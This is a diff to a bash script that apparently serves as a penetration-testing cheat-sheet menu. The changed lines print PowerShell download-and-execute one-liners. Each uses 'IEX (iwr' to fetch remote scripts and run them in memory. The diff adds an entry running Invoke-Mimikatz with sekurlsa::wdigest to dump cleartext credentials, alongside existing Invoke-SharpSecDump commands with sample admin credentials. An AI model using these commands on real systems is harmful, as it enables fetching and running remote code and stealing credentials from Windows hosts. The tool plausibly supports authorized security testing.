@@ -441,7 +441,7 @@ echo -ne "
 # Download Methods                                                             #
 ################################################################################
 
-iwr="iex (iwr -usebasicparsing "
+iwr="IEX (iwr"
 DownloadMethod="$iwr"
 
 
@@ -869,6 +869,12 @@ echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSecDump.ps1);Invoke-Sh
 echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
 echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
 echo -e ""
+echo -e ""
+echo -e "${LGREEN}Dump clear text credentials${RESTORE}"
+echo -e "${YELLOW}URL:${RESTORE}https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/credential-dumping/lsass-memory#dumping-cleartext-credentials"
+echo -e ""
+echo -e "${IBLUE}Mimikatz${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command "\"sekurlsa::wdigest"\""
 echo -e ""
 
 echo -ne  "Return to Previous Menu?
